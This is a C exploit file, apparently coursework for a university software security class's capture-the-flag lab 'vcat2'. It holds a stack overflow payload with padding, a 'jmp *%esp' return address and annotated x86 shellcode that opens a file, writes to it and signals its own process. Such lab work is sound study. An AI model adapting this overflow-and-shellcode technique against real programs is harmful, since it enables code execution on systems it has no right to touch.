/*
 * CTF-2 `vcat2' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <stdlib.h>
#include <unistd.h>

unsigned char payload[] =
	/* ------------------------------------	*/
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXX"
	/* ------------------------------------	*/
	"\x1d\x90\x04\x08" /* &'jmp *%esp'	*/
	/* ------------------------------------	*/
	/* FIXME */
	/* ------------------------------------	*/
	// Once we've jumped to %esp, %eax has value 0 (all 0's!)
	
	// Push the string to the stack
	"\x6A\x74"				// push 't'
	"\x68\x63\x2E\x74\x78"	// push 'c.tx'
	"\x68\x6D\x61\x67\x69"	// push 'magi'
	"\x89\xE3"				// mov %esp to %ebx
	"\x6A\x01"				// push 0x1
	"\x59"					// pop %ecx
	"\x89\xD0"				// mov %eax to %edx
	"\x6A\x05"				// push 0x05
	"\x58"					// pop %eax (this is the open syscall)
	"\xCD\x80"				// int 0x80 (syscall!)

	"\x89\xC3"				// mov %eax to %ebx
	"\x6A\x79"				// push 'y'
	"\x68\x78\x79\x7A\x7A"	// push 'xyzz'
	"\x89\xE1"				// mov %esp into %ecx
	"\x6A\x05"				// push 0x05
	"\x5A"					// pop %edx
	"\x6A\x04"				// push 0x04
	"\x58"					// pop %eax
	"\xCD\x80"				// int 0x80 (syscall!)

	"\x6A\x14"	// Push 0x14 (syscall for getpid())
	"\x58"		// pop into %eax
	"\xCD\x80"	// int 0x80 (syscall!)
	"\x89\xC3"	// mov eax into %ebx (for kill)
	"\x6A\x0C"	// push 0x0a
	"\x59"		// pop %ecx
	"\x6a\x25"	// push 0x25
	"\x58"		// pop %eax
	"\xCD\x80"	// int 0x80 (syscall!)
	/* ------------------------------------	*/


;

int main(int argc, char **argv)
{
	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success		*/
	return EXIT_SUCCESS;
}
